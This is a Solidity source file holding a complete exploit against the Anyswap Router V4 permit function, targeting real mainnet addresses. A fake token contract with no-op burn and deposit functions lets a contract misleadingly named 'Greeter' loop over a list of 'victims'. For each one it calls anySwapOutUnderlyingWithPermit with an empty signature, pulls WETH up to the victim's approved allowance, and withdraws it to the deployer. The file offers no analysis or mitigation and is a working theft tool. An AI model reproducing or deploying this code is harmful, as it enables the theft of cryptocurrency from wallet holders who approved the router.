//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IAnyswapRouterV4 {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint toChainID
    ) external;
}

contract FakeToken {
    address public immutable underlying = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private bro;  

    constructor() {
        bro = msg.sender;
    }

    function burn(address, uint256) external pure returns (bool) {
        return true;
    }

    function depositVault(uint, address) external pure returns (uint) {
        return 0;
    }

    modifier onlyBro {
        require(msg.sender == bro);
        _;
    }

    function withdraw() external onlyBro {
        IERC20(underlying).transfer(bro, IERC20(underlying).balanceOf(address(this)));
    }
}

contract Greeter {
    address constant private WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant private ANYSWAP_ROUTER_V4 = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
    FakeToken private ANYSWAP_V1_WETH;
    address private owner;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = msg.sender;
        ANYSWAP_V1_WETH = new FakeToken();
    }

    function greet(address[] calldata victims) external onlyOwner {
        for (uint256 i = 0; i < victims.length; i++) {
            address victim = victims[i];
            uint bal = IERC20(WETH).balanceOf(victim);
            uint allowance = IERC20(WETH).allowance(victim, ANYSWAP_ROUTER_V4);
            uint amount = bal > allowance ? allowance : bal;
            IAnyswapRouterV4(ANYSWAP_ROUTER_V4).anySwapOutUnderlyingWithPermit(victim, address(ANYSWAP_V1_WETH), address(this), amount, block.timestamp + 120, 0, bytes32(""), bytes32(""), 56);        
        }
        ANYSWAP_V1_WETH.withdraw();
    }
}
